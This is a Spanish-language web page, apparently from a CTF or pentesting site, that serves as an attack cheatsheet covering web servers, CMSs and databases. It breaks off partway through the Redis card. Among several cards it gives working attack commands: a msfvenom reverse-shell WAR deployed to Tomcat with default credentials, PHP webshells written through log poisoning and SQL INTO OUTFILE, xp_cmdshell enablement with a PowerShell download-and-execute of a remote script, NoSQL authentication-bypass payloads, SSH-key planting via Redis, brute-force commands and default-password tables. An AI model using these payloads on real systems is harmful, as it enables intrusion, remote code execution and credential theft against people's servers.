---
layout: default
title: Cheatsheet
---

<div class="page">
  <div class="section-header">
    <h2>Cheatsheet</h2>
    <p>Referencia rápida de puertos, servicios, vulnerabilidades y credenciales por defecto.</p>
  </div>
</div>

<style>
  .cs-outer { max-width: 780px; margin: 0 auto; padding: 0 2rem 4rem; }

  /* TABS PRINCIPALES */
  .cs-main-tabs { display: flex; gap: 8px; margin-bottom: 1.5rem; flex-wrap: wrap; }
  .cs-main-tab {
    font-family: var(--mono); font-size: 12px; padding: 6px 16px;
    border-radius: 20px; border: 1px solid var(--border-strong);
    background: transparent; color: var(--text-muted);
    cursor: pointer; transition: all 0.15s;
  }
  .cs-main-tab:hover { background: var(--surface2); color: var(--text); }
  .cs-main-tab.active { background: #0c1f35; color: #60a5fa; border-color: #378ADD; }

  .cs-main-panel { display: none; }
  .cs-main-panel.active { display: block; }

  /* SEARCH */
  .cs-search {
    width: 100%; margin-bottom: 1.25rem; box-sizing: border-box;
    background: var(--surface2); border: 1px solid var(--border-strong);
    border-radius: 6px; padding: 0.4rem 0.85rem;
    font-size: 13px; color: var(--text); font-family: var(--sans); outline: none;
  }
  .cs-search::placeholder { color: var(--text-dim); }
  .cs-search:focus { border-color: rgba(255,255,255,0.25); }

  /* CARDS */
  .cs-card {
    background: var(--surface); border: 1px solid var(--border);
    border-radius: var(--radius); margin-bottom: 10px; overflow: hidden;
  }
  .cs-card-header {
    display: flex; align-items: center; gap: 10px;
    padding: 0.9rem 1.1rem; cursor: pointer;
    transition: background 0.12s; user-select: none;
  }
  .cs-card-header:hover { background: var(--surface2); }
  .cs-badge {
    font-size: 11px; font-weight: 500; padding: 3px 9px;
    border-radius: var(--radius-sm); flex-shrink: 0; font-family: var(--mono);
  }
  .cs-badge.web   { background: #0d2b14; color: #4ade80; }
  .cs-badge.cms   { background: #0c1f35; color: #60a5fa; }
  .cs-badge.db    { background: #2b1a05; color: #fb923c; }
  .cs-badge.devops{ background: #1a0d2b; color: #c084fc; }
  .cs-badge.net   { background: #2b0d0d; color: #f87171; }
  .cs-badge.port  { background: #0c1f35; color: #60a5fa; }

  .cs-header-text { flex: 1; }
  .cs-header-text h3 { font-size: 14px; font-weight: 500; color: var(--text); margin: 0 0 2px; }
  .cs-header-text p  { font-size: 12px; color: var(--text-muted); margin: 0; }
  .cs-chevron { color: var(--text-dim); transition: transform 0.2s; font-size: 16px; }
  .cs-card.open .cs-chevron { transform: rotate(180deg); }

  .cs-body { display: none; padding: 0 1.1rem 1.1rem; border-top: 1px solid var(--border); }
  .cs-card.open .cs-body { display: block; }

  .cs-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 1rem; }
  .cs-section { background: var(--surface2); border-radius: var(--radius-sm); padding: 0.75rem 0.9rem; }
  .cs-section.full { grid-column: 1 / -1; }
  .cs-section h4 {
    font-size: 10px; font-weight: 500; color: var(--text-dim);
    text-transform: uppercase; letter-spacing: 0.08em;
    margin: 0 0 8px; font-family: var(--mono);
  }
  .cs-section ul { list-style: none; margin: 0; padding: 0; }
  .cs-section ul li { font-size: 12px; color: var(--text-muted); padding: 2px 0; display: flex; gap: 6px; align-items: flex-start; }
  .cs-section ul li::before { content: '·'; color: var(--text-dim); flex-shrink: 0; }

  .cs-cmd {
    font-family: var(--mono); font-size: 11px;
    background: var(--surface); padding: 2px 6px;
    border-radius: 4px; border: 1px solid var(--border);
    display: inline-block; margin: 1px 0; color: #c084fc;
  }
  .cs-tag-vuln {
    display: inline-block; font-size: 11px; padding: 1px 7px;
    border-radius: 4px; background: #2b0d0d; color: #f87171;
  }
  .cs-tip {
    grid-column: 1 / -1;
    background: #0c1f35; border-left: 3px solid #378ADD;
    border-radius: 0 var(--radius-sm) var(--radius-sm) 0;
    padding: 0.7rem 0.9rem; font-size: 12px; color: #60a5fa;
  }
  .cs-tip strong {
    font-size: 10px; font-weight: 500; text-transform: uppercase;
    letter-spacing: 0.07em; display: block; margin-bottom: 3px; font-family: var(--mono);
  }

  /* CREDENCIALES DENTRO DE TARJETA */
  .cs-cred-mini { grid-column: 1 / -1; background: var(--surface2); border-radius: var(--radius-sm); padding: 0.75rem 0.9rem; }
  .cs-cred-mini h4 { font-size: 10px; font-weight: 500; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.08em; margin: 0 0 8px; font-family: var(--mono); }
  .cs-cred-row { display: flex; gap: 8px; align-items: center; padding: 3px 0; border-bottom: 1px solid var(--border); }
  .cs-cred-row:last-child { border-bottom: none; }
  .cs-cred-user { font-family: var(--mono); font-size: 12px; color: #60a5fa; min-width: 100px; }
  .cs-cred-pass { font-family: var(--mono); font-size: 12px; color: #4ade80; min-width: 100px; }
  .cs-cred-note { font-size: 11px; color: var(--text-muted); }

  /* TABLA CREDENCIALES */
  .cs-cred-table { width: 100%; border-collapse: collapse; font-size: 12px; }
  .cs-cred-table th {
    background: var(--surface2); color: var(--text-dim); padding: 6px 10px;
    text-align: left; font-size: 10px; font-weight: 500; text-transform: uppercase;
    letter-spacing: 0.06em; border-bottom: 1px solid var(--border); font-family: var(--mono);
  }
  .cs-cred-table td { padding: 6px 10px; border-bottom: 1px solid var(--border); font-family: var(--mono); font-size: 12px; }
  .cs-cred-table tr:last-child td { border-bottom: none; }
  .cs-cred-table tr:hover td { background: var(--surface2); }
  .cs-service-label {
    font-size: 11px; font-weight: 500; color: var(--text-muted);
    background: var(--surface2); padding: 2px 7px; border-radius: 4px;
  }

  /* PUERTOS */
  .pt-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(90px, 1fr)); gap: 8px; margin-bottom: 1.5rem; }
  .pt-btn {
    background: var(--surface); border: 1px solid var(--border);
    border-radius: var(--radius); padding: 10px 8px;
    cursor: pointer; text-align: center; transition: all 0.15s;
  }
  .pt-btn:hover { border-color: var(--border-strong); background: var(--surface2); }
  .pt-btn.selected { border: 2px solid #378ADD; background: #0c1f35; }
  .pt-btn .pnum { font-size: 14px; font-weight: 500; color: var(--text); display: block; font-family: var(--mono); }
  .pt-btn .pname { font-size: 10px; color: var(--text-muted); display: block; margin-top: 2px; }
  .pt-btn.selected .pnum, .pt-btn.selected .pname { color: #60a5fa; }
  .pt-btn.pt-hidden { display: none; }
  .pt-divider { border: none; border-top: 1px solid var(--border); margin: 0.5rem 0 1.5rem; }
  .pt-top { display: flex; gap: 10px; margin-bottom: 1rem; align-items: center; }
  .pt-search {
    flex: 1; background: var(--surface2); border: 1px solid var(--border-strong);
    border-radius: 6px; padding: 0.4rem 0.85rem; font-size: 13px;
    color: var(--text); font-family: var(--sans); outline: none;
  }
  .pt-search::placeholder { color: var(--text-dim); }
  .pt-clear-btn {
    font-family: var(--mono); font-size: 12px; padding: 4px 14px;
    border-radius: 20px; border: 1px solid var(--border-strong);
    background: transparent; color: var(--text-muted); cursor: pointer; transition: all 0.15s;
  }
  .pt-clear-btn:hover { background: var(--surface2); color: var(--text); }
  .pt-port-badge {
    font-size: 15px; font-weight: 500; color: #60a5fa; background: #0c1f35;
    border-radius: var(--radius-sm); padding: 5px 12px; min-width: 58px;
    text-align: center; flex-shrink: 0; font-family: var(--mono);
  }
  .pt-remove {
    background: none; border: none; cursor: pointer; color: var(--text-dim);
    font-size: 16px; padding: 0 0 0 8px; line-height: 1; flex-shrink: 0; transition: color 0.15s;
  }
  .pt-remove:hover { color: #f87171; }
  .pt-proto {
    font-size: 11px; color: var(--text-dim); background: var(--surface2);
    border: 1px solid var(--border); border-radius: 4px; padding: 3px 8px;
    flex-shrink: 0; font-family: var(--mono);
  }
  .pt-empty { text-align: center; padding: 2.5rem; color: var(--text-dim); font-size: 14px; font-family: var(--mono); }
  .cs-hidden { display: none !important; }
</style>

<div class="cs-outer">
  <div class="cs-main-tabs">
    <button class="cs-main-tab active" onclick="switchMain(event,'ports')">Puertos</button>
    <button class="cs-main-tab" onclick="switchMain(event,'web')">Servicios web</button>
    <button class="cs-main-tab" onclick="switchMain(event,'cms')">CMS</button>
    <button class="cs-main-tab" onclick="switchMain(event,'db')">Bases de datos</button>
    <button class="cs-main-tab" onclick="switchMain(event,'devops')">DevOps</button>
    <button class="cs-main-tab" onclick="switchMain(event,'net')">Red / SMB</button>
    <button class="cs-main-tab" onclick="switchMain(event,'cred')">Credenciales</button>
  </div>

  <!-- ═══ PUERTOS ═══ -->
  <div class="cs-main-panel active" id="panel-ports">
    <div class="pt-top">
      <input class="pt-search" type="text" id="pt-filter" placeholder="Filtrar por puerto o servicio...">
      <button class="pt-clear-btn" id="pt-clear-btn">↺ Limpiar</button>
    </div>
    <div class="pt-grid" id="pt-grid"></div>
    <hr class="pt-divider" id="pt-divider" style="display:none">
    <div id="pt-detail"></div>
  </div>

  <!-- ═══ SERVICIOS WEB ═══ -->
  <div class="cs-main-panel" id="panel-web">
    <input class="cs-search" type="text" placeholder="Filtrar servicios web..." oninput="filterCards('web',this.value)">
    <div id="list-web">
      <div class="cs-card" id="web-nginx">
        <div class="cs-card-header" onclick="toggleCard('web-nginx')">
          <span class="cs-badge web">Nginx</span>
          <div class="cs-header-text"><h3>Nginx</h3><p>Servidor web y proxy inverso de alto rendimiento</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Rutas clave</h4><ul><li>/etc/nginx/nginx.conf</li><li>/etc/nginx/sites-enabled/</li><li>/var/log/nginx/access.log</li><li>/var/www/html/</li></ul></div>
          <div class="cs-section"><h4>Vulnerabilidades</h4><ul><li><span class="cs-tag-vuln">Alias traversal (LFI)</span></li><li><span class="cs-tag-vuln">SSRF via proxy_pass</span></li><li><span class="cs-tag-vuln">Off-by-slash misconfiguration</span></li><li><span class="cs-tag-vuln">HTTP request smuggling</span></li></ul></div>
          <div class="cs-section full"><h4>Comandos</h4><ul><li><span class="cs-cmd">curl -I http://ip</span></li><li><span class="cs-cmd">gobuster dir -u http://ip -w common.txt</span></li><li><span class="cs-cmd">nikto -h http://ip</span></li><li><span class="cs-cmd">curl http://ip/static../etc/passwd</span></li></ul></div>
          <div class="cs-tip"><strong>Tip</strong>El off-by-slash: si el alias es /files/ pero la location es /files, puedes hacer /files../etc/passwd. Revisa siempre la configuración de alias.</div>
        </div></div>
      </div>
      <div class="cs-card" id="web-apache">
        <div class="cs-card-header" onclick="toggleCard('web-apache')">
          <span class="cs-badge web">Apache</span>
          <div class="cs-header-text"><h3>Apache HTTP Server</h3><p>Servidor web más popular. Muy común en CTFs</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Rutas clave</h4><ul><li>/etc/apache2/apache2.conf</li><li>/var/log/apache2/access.log</li><li>/var/www/html/</li><li>.htaccess</li></ul></div>
          <div class="cs-section"><h4>Vulnerabilidades</h4><ul><li><span class="cs-tag-vuln">Shellshock (mod_cgi)</span></li><li><span class="cs-tag-vuln">Log poisoning + LFI</span></li><li><span class="cs-tag-vuln">CVE-2021-41773 path traversal</span></li><li><span class="cs-tag-vuln">Directory listing</span></li></ul></div>
          <div class="cs-section full"><h4>Comandos</h4><ul><li><span class="cs-cmd">gobuster dir -u http://ip -w common.txt -x php,html,txt,bak</span></li><li><span class="cs-cmd">curl http://ip/server-status</span></li><li><span class="cs-cmd">curl -A "&lt;?php system(\$_GET['c']); ?&gt;" http://ip</span></li></ul></div>
          <div class="cs-tip"><strong>Tip</strong>Log poisoning: inyecta PHP en el User-Agent, luego incluye el log via LFI: /page.php?file=/var/log/apache2/access.log&c=id</div>
        </div></div>
      </div>
      <div class="cs-card" id="web-tomcat">
        <div class="cs-card-header" onclick="toggleCard('web-tomcat')">
          <span class="cs-badge web">Tomcat</span>
          <div class="cs-header-text"><h3>Apache Tomcat</h3><p>Servidor Java. Manager = WAR upload = RCE</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Rutas clave</h4><ul><li>/manager/html</li><li>/host-manager/html</li><li>conf/tomcat-users.xml</li><li>/WEB-INF/web.xml</li></ul></div>
          <div class="cs-section"><h4>Vulnerabilidades</h4><ul><li><span class="cs-tag-vuln">WAR upload RCE</span></li><li><span class="cs-tag-vuln">CVE-2020-1938 Ghostcat</span></li><li><span class="cs-tag-vuln">PUT method habilitado</span></li></ul></div>
          <div class="cs-section full"><h4>Comandos</h4><ul><li><span class="cs-cmd">msfvenom -p java/jsp_shell_reverse_tcp LHOST=ip LPORT=4444 -f war -o shell.war</span></li><li><span class="cs-cmd">curl -u tomcat:tomcat -T shell.war "http://ip:8080/manager/text/deploy?path=/shell"</span></li><li><span class="cs-cmd">nmap -p8009 --script ajp-headers ip</span></li></ul></div>
          <div class="cs-cred-mini"><h4>Credenciales por defecto</h4>
            <div class="cs-cred-row"><span class="cs-cred-user">tomcat</span><span class="cs-cred-pass">tomcat</span><span class="cs-cred-note">Más común</span></div>
            <div class="cs-cred-row"><span class="cs-cred-user">admin</span><span class="cs-cred-pass">admin</span><span class="cs-cred-note">Común</span></div>
            <div class="cs-cred-row"><span class="cs-cred-user">tomcat</span><span class="cs-cred-pass">s3cret</span><span class="cs-cred-note">Documentación oficial</span></div>
          </div>
          <div class="cs-tip"><strong>Tip</strong>Ghostcat (CVE-2020-1938) afecta al puerto AJP 8009 y permite leer archivos internos incluyendo WEB-INF/web.xml con credenciales.</div>
        </div></div>
      </div>
      <div class="cs-card" id="web-iis">
        <div class="cs-card-header" onclick="toggleCard('web-iis')">
          <span class="cs-badge web">IIS</span>
          <div class="cs-header-text"><h3>Microsoft IIS</h3><p>Servidor web de Windows. Webshells .aspx</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Rutas clave</h4><ul><li>C:\inetpub\wwwroot\</li><li>web.config</li><li>C:\inetpub\logs\</li></ul></div>
          <div class="cs-section"><h4>Vulnerabilidades</h4><ul><li><span class="cs-tag-vuln">Webshell upload (.aspx)</span></li><li><span class="cs-tag-vuln">WebDAV RCE (CVE-2017-7269)</span></li><li><span class="cs-tag-vuln">Short filename disclosure (~1)</span></li></ul></div>
          <div class="cs-section full"><h4>Comandos</h4><ul><li><span class="cs-cmd">gobuster dir -u http://ip -w common.txt -x asp,aspx,txt,config</span></li><li><span class="cs-cmd">davtest -url http://ip</span></li><li><span class="cs-cmd">curl http://ip/~1/</span></li></ul></div>
          <div class="cs-tip"><strong>Tip</strong>Si WebDAV está activo, sube una webshell .aspx con cadaver. El truco del ~1 enumera nombres de archivo cortos de Windows.</div>
        </div></div>
      </div>
      <div class="cs-card" id="web-webmin">
        <div class="cs-card-header" onclick="toggleCard('web-webmin')">
          <span class="cs-badge web">Webmin</span>
          <div class="cs-header-text"><h3>Webmin</h3><p>Panel de administración Linux en puerto 10000</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Acceso</h4><ul><li>https://ip:10000/</li><li>/etc/webmin/</li></ul></div>
          <div class="cs-section"><h4>Vulnerabilidades</h4><ul><li><span class="cs-tag-vuln">CVE-2019-15107 (RCE sin auth)</span></li><li><span class="cs-tag-vuln">CVE-2019-15231 (backdoor)</span></li></ul></div>
          <div class="cs-section full"><h4>Comandos</h4><ul><li><span class="cs-cmd">nmap -p10000 ip</span></li><li><span class="cs-cmd">msfconsole: use exploit/unix/webapp/webmin_backdoor</span></li></ul></div>
          <div class="cs-cred-mini"><h4>Credenciales por defecto</h4>
            <div class="cs-cred-row"><span class="cs-cred-user">root</span><span class="cs-cred-pass">root</span><span class="cs-cred-note">Usa credenciales del sistema</span></div>
            <div class="cs-cred-row"><span class="cs-cred-user">admin</span><span class="cs-cred-pass">admin</span><span class="cs-cred-note">Sin configurar</span></div>
          </div>
          <div class="cs-tip"><strong>Tip</strong>CVE-2019-15107 permite RCE sin autenticación en versiones 1.882-1.921. Trivial con Metasploit: webmin_backdoor.</div>
        </div></div>
      </div>
      <div class="cs-card" id="web-phpmyadmin">
        <div class="cs-card-header" onclick="toggleCard('web-phpmyadmin')">
          <span class="cs-badge web">phpMyAdmin</span>
          <div class="cs-header-text"><h3>phpMyAdmin / Adminer</h3><p>Interfaces web para bases de datos. SQL = RCE</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Rutas comunes</h4><ul><li>/phpmyadmin/</li><li>/pma/</li><li>/db/</li><li>/adminer.php</li></ul></div>
          <div class="cs-section"><h4>Vulnerabilidades</h4><ul><li><span class="cs-tag-vuln">SQL INTO OUTFILE (RCE)</span></li><li><span class="cs-tag-vuln">CVE-2018-12613 (LFI)</span></li><li><span class="cs-tag-vuln">Adminer SSRF</span></li></ul></div>
          <div class="cs-section full"><h4>RCE via SQL</h4><ul><li><span class="cs-cmd">SELECT "&lt;?php system(\$_GET['c']); ?&gt;" INTO OUTFILE '/var/www/html/sh.php'</span></li><li><span class="cs-cmd">curl http://ip/sh.php?c=id</span></li></ul></div>
          <div class="cs-cred-mini"><h4>Credenciales por defecto</h4>
            <div class="cs-cred-row"><span class="cs-cred-user">root</span><span class="cs-cred-pass">(vacía)</span><span class="cs-cred-note">MySQL local sin pass</span></div>
            <div class="cs-cred-row"><span class="cs-cred-user">phpmyadmin</span><span class="cs-cred-pass">phpmyadmin</span><span class="cs-cred-note">Común</span></div>
          </div>
          <div class="cs-tip"><strong>Tip</strong>Con INTO OUTFILE necesitas permisos FILE. Prueba rutas: /var/www/html/, /srv/http/, /var/www/.</div>
        </div></div>
      </div>
    </div>
  </div>

  <!-- ═══ CMS ═══ -->
  <div class="cs-main-panel" id="panel-cms">
    <input class="cs-search" type="text" placeholder="Filtrar CMS..." oninput="filterCards('cms',this.value)">
    <div id="list-cms">
      <div class="cs-card" id="cms-wordpress">
        <div class="cs-card-header" onclick="toggleCard('cms-wordpress')">
          <span class="cs-badge cms">WordPress</span>
          <div class="cs-header-text"><h3>WordPress</h3><p>CMS más popular. wpscan es tu mejor amigo</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Rutas clave</h4><ul><li>/wp-login.php</li><li>/wp-admin/</li><li>/wp-content/plugins/</li><li>/wp-config.php</li><li>/xmlrpc.php</li></ul></div>
          <div class="cs-section"><h4>Vulnerabilidades</h4><ul><li><span class="cs-tag-vuln">Plugins vulnerables</span></li><li><span class="cs-tag-vuln">Theme editor RCE</span></li><li><span class="cs-tag-vuln">XML-RPC brute force</span></li></ul></div>
          <div class="cs-section full"><h4>Comandos</h4><ul><li><span class="cs-cmd">wpscan --url http://ip -e u,p,t</span></li><li><span class="cs-cmd">wpscan --url http://ip -P rockyou.txt -U admin</span></li><li><span class="cs-cmd">curl http://ip/wp-json/wp/v2/users</span></li></ul></div>
          <div class="cs-cred-mini"><h4>Credenciales por defecto</h4>
            <div class="cs-cred-row"><span class="cs-cred-user">admin</span><span class="cs-cred-pass">admin</span><span class="cs-cred-note">Sin configurar</span></div>
            <div class="cs-cred-row"><span class="cs-cred-user">admin</span><span class="cs-cred-pass">password</span><span class="cs-cred-note">Común</span></div>
          </div>
          <div class="cs-tip"><strong>Tip</strong>Con acceso al panel: Apariencia → Editor de temas → 404.php → inyecta reverse shell PHP. O sube un plugin malicioso.</div>
        </div></div>
      </div>
      <div class="cs-card" id="cms-drupal">
        <div class="cs-card-header" onclick="toggleCard('cms-drupal')">
          <span class="cs-badge cms">Drupal</span>
          <div class="cs-header-text"><h3>Drupal</h3><p>CMS empresarial. Drupalgeddon es su vulnerabilidad icónica</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Rutas clave</h4><ul><li>/user/login</li><li>/admin/</li><li>/CHANGELOG.txt (versión)</li><li>/sites/default/settings.php</li></ul></div>
          <div class="cs-section"><h4>Vulnerabilidades</h4><ul><li><span class="cs-tag-vuln">Drupalgeddon2 (CVE-2018-7600)</span></li><li><span class="cs-tag-vuln">Drupalgeddon3 (CVE-2018-7602)</span></li><li><span class="cs-tag-vuln">PHP filter module RCE</span></li></ul></div>
          <div class="cs-section full"><h4>Comandos</h4><ul><li><span class="cs-cmd">droopescan scan drupal -u http://ip</span></li><li><span class="cs-cmd">curl http://ip/CHANGELOG.txt</span></li><li><span class="cs-cmd">msfconsole: use exploit/unix/webapp/drupal_drupalgeddon2</span></li></ul></div>
          <div class="cs-cred-mini"><h4>Credenciales por defecto</h4>
            <div class="cs-cred-row"><span class="cs-cred-user">admin</span><span class="cs-cred-pass">admin</span><span class="cs-cred-note">Instalación por defecto</span></div>
          </div>
          <div class="cs-tip"><strong>Tip</strong>Drupalgeddon2 afecta versiones &lt; 7.58 y &lt; 8.5.1. Con PHP filter activado y acceso admin, ejecutas PHP directamente desde el editor.</div>
        </div></div>
      </div>
      <div class="cs-card" id="cms-joomla">
        <div class="cs-card-header" onclick="toggleCard('cms-joomla')">
          <span class="cs-badge cms">Joomla</span>
          <div class="cs-header-text"><h3>Joomla</h3><p>CMS popular. Panel en /administrator</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Rutas clave</h4><ul><li>/administrator/</li><li>/configuration.php</li><li>/README.txt (versión)</li></ul></div>
          <div class="cs-section"><h4>Vulnerabilidades</h4><ul><li><span class="cs-tag-vuln">CVE-2023-23752 (info disclosure)</span></li><li><span class="cs-tag-vuln">Template RCE con acceso admin</span></li><li><span class="cs-tag-vuln">SQLi en componentes</span></li></ul></div>
          <div class="cs-section full"><h4>Comandos</h4><ul><li><span class="cs-cmd">joomscan --url http://ip</span></li><li><span class="cs-cmd">curl http://ip/api/index.php/v1/config/application?public=true</span></li></ul></div>
          <div class="cs-cred-mini"><h4>Credenciales por defecto</h4>
            <div class="cs-cred-row"><span class="cs-cred-user">admin</span><span class="cs-cred-pass">admin</span><span class="cs-cred-note">Por defecto</span></div>
          </div>
          <div class="cs-tip"><strong>Tip</strong>CVE-2023-23752 expone credenciales de la base de datos sin autenticación. Con acceso admin: Extensions → Templates → edita el PHP activo para RCE.</div>
        </div></div>
      </div>
      <div class="cs-card" id="cms-magento">
        <div class="cs-card-header" onclick="toggleCard('cms-magento')">
          <span class="cs-badge cms">Magento</span>
          <div class="cs-header-text"><h3>Magento</h3><p>E-commerce. local.xml tiene credenciales de la DB</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Rutas clave</h4><ul><li>/admin/</li><li>/index.php/admin</li><li>/app/etc/local.xml</li><li>/downloader/</li></ul></div>
          <div class="cs-section"><h4>Vulnerabilidades</h4><ul><li><span class="cs-tag-vuln">CVE-2019-8144 (RCE sin auth)</span></li><li><span class="cs-tag-vuln">Magento Shoplift (SQLi)</span></li><li><span class="cs-tag-vuln">Template injection</span></li></ul></div>
          <div class="cs-section full"><h4>Comandos</h4><ul><li><span class="cs-cmd">magescan scan:all http://ip</span></li><li><span class="cs-cmd">curl http://ip/app/etc/local.xml</span></li></ul></div>
          <div class="cs-cred-mini"><h4>Credenciales por defecto</h4>
            <div class="cs-cred-row"><span class="cs-cred-user">admin</span><span class="cs-cred-pass">admin123</span><span class="cs-cred-note">Por defecto</span></div>
          </div>
          <div class="cs-tip"><strong>Tip</strong>local.xml contiene las credenciales de la base de datos en texto plano. Intenta acceder a ese archivo primero.</div>
        </div></div>
      </div>
    </div>
  </div>

  <!-- ═══ BASES DE DATOS ═══ -->
  <div class="cs-main-panel" id="panel-db">
    <input class="cs-search" type="text" placeholder="Filtrar bases de datos..." oninput="filterCards('db',this.value)">
    <div id="list-db">
      <div class="cs-card" id="db-mysql">
        <div class="cs-card-header" onclick="toggleCard('db-mysql')">
          <span class="cs-badge db">MySQL</span>
          <div class="cs-header-text"><h3>MySQL / MariaDB</h3><p>Busca credenciales en wp-config.php, .env, config.php</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Enumeración</h4><ul><li><span class="cs-cmd">show databases;</span></li><li><span class="cs-cmd">use db; show tables;</span></li><li><span class="cs-cmd">select * from users;</span></li><li><span class="cs-cmd">select user,password from mysql.user;</span></li></ul></div>
          <div class="cs-section"><h4>Escalación / RCE</h4><ul><li><span class="cs-cmd">SELECT "&lt;?php system(\$_GET['c']); ?&gt;" INTO OUTFILE '/var/www/html/sh.php'</span></li><li><span class="cs-cmd">LOAD DATA INFILE '/etc/passwd' INTO TABLE t;</span></li></ul></div>
          <div class="cs-section full"><h4>Conexión</h4><ul><li><span class="cs-cmd">mysql -h ip -u root -p</span></li><li><span class="cs-cmd">hydra -l root -P rockyou.txt mysql://ip</span></li><li><span class="cs-cmd">nmap -p3306 --script mysql-brute,mysql-empty-password ip</span></li></ul></div>
          <div class="cs-cred-mini"><h4>Credenciales por defecto</h4>
            <div class="cs-cred-row"><span class="cs-cred-user">root</span><span class="cs-cred-pass">(vacía)</span><span class="cs-cred-note">Instalaciones locales</span></div>
            <div class="cs-cred-row"><span class="cs-cred-user">root</span><span class="cs-cred-pass">root</span><span class="cs-cred-note">Muy común</span></div>
            <div class="cs-cred-row"><span class="cs-cred-user">root</span><span class="cs-cred-pass">mysql</span><span class="cs-cred-note">Instalaciones antiguas</span></div>
          </div>
          <div class="cs-tip"><strong>Tip</strong>Busca credenciales en: wp-config.php, config.php, .env, database.yml, settings.py. Con INTO OUTFILE y permisos FILE puedes escribir una webshell.</div>
        </div></div>
      </div>
      <div class="cs-card" id="db-mssql">
        <div class="cs-card-header" onclick="toggleCard('db-mssql')">
          <span class="cs-badge db">MSSQL</span>
          <div class="cs-header-text"><h3>Microsoft SQL Server</h3><p>xp_cmdshell permite ejecutar comandos del sistema</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Enumeración</h4><ul><li><span class="cs-cmd">SELECT name FROM master.dbo.sysdatabases;</span></li><li><span class="cs-cmd">SELECT name,password_hash FROM sys.sql_logins;</span></li></ul></div>
          <div class="cs-section"><h4>RCE via xp_cmdshell</h4><ul><li><span class="cs-cmd">EXEC sp_configure 'show advanced options',1; RECONFIGURE;</span></li><li><span class="cs-cmd">EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;</span></li><li><span class="cs-cmd">EXEC xp_cmdshell 'whoami';</span></li></ul></div>
          <div class="cs-section full"><h4>Conexión</h4><ul><li><span class="cs-cmd">impacket-mssqlclient user:pass@ip</span></li><li><span class="cs-cmd">nmap -p1433 --script ms-sql-info,ms-sql-empty-password ip</span></li></ul></div>
          <div class="cs-cred-mini"><h4>Credenciales por defecto</h4>
            <div class="cs-cred-row"><span class="cs-cred-user">sa</span><span class="cs-cred-pass">(vacía)</span><span class="cs-cred-note">Por defecto</span></div>
            <div class="cs-cred-row"><span class="cs-cred-user">sa</span><span class="cs-cred-pass">sa</span><span class="cs-cred-note">Muy común</span></div>
          </div>
          <div class="cs-tip"><strong>Tip</strong>Desde xp_cmdshell: xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ip/shell.ps1'')"'</div>
        </div></div>
      </div>
      <div class="cs-card" id="db-mongodb">
        <div class="cs-card-header" onclick="toggleCard('db-mongodb')">
          <span class="cs-badge db">MongoDB</span>
          <div class="cs-header-text"><h3>MongoDB</h3><p>NoSQL. Sin auth por defecto. NoSQL injection en apps web</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Enumeración</h4><ul><li><span class="cs-cmd">show dbs</span></li><li><span class="cs-cmd">use db; show collections;</span></li><li><span class="cs-cmd">db.users.find().pretty()</span></li></ul></div>
          <div class="cs-section"><h4>NoSQL Injection</h4><ul><li><span class="cs-cmd">username[$ne]=x&password[$ne]=x</span></li><li>Operadores: $ne, $gt, $regex, $where</li></ul></div>
          <div class="cs-section full"><h4>Conexión</h4><ul><li><span class="cs-cmd">mongosh ip</span></li><li><span class="cs-cmd">mongosh "mongodb://user:pass@ip:27017/db"</span></li></ul></div>
          <div class="cs-cred-mini"><h4>Credenciales por defecto</h4>
            <div class="cs-cred-row"><span class="cs-cred-user">(ninguno)</span><span class="cs-cred-pass">(vacía)</span><span class="cs-cred-note">Sin auth por defecto</span></div>
          </div>
          <div class="cs-tip"><strong>Tip</strong>NoSQL injection: username=admin&password[$ne]=x bypasea auth. En JSON: "password":{"$regex":".*"} también funciona.</div>
        </div></div>
      </div>
      <div class="cs-card" id="db-redis">
        <div class="cs-card-header" onclick="toggleCard('db-redis')">
          <span class="cs-badge db">Redis</span>
          <div class="cs-header-text"><h3>Redis</h3><p>In-memory. Escritura de archivos = SSH key = root</p></div>
          <span class="cs-chevron">▾</span>
        </div>
        <div class="cs-body"><div class="cs-grid">
          <div class="cs-section"><h4>Enumeración</h4><ul><li><span class="cs-cmd">redis-cli -h ip ping</span></li><li><span class="cs-cmd">redis-cli -h ip info</span></li><li><span class="cs-cmd">redis-cli -h ip keys *</span></li></ul></div>
          <div class="cs-section"><h4>Escalación via SSH key</h4><ul><li><span class="cs-cmd">CONFIG SET dir /root/.ssh</span></li><li><span class="cs-cmd">CONFIG SET dbfilename authorized_keys</span></li><li><span class="cs-cmd">SET x "\n\nssh-rsa AAAA...\n\n"</span></li><li><span class="cs-cmd">SAVE</span></li></ul></div>
